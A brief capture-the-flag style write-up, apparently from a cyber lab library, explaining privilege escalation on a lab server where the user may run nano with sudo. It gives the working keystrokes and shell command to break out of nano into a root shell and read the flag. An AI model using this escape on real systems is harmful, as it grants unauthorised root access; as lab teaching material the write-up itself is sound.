# URL
https://learn.cylabacademy.org/library/748
# Concept
* privileged file read
* sudo nano
* privilege escalation
# Method of solve
* Our user account on the server has sudo permissions with the `nano` text editor
```
sudo nano /etc/sudoers
```
* once inside of nano, we can either load in the contents of the flag, or, what we're going to do, break out into a shell as root
```
ctrl + r
ctrl + x
reset; sh 1>&0 2>&0
cat flag.txt
```

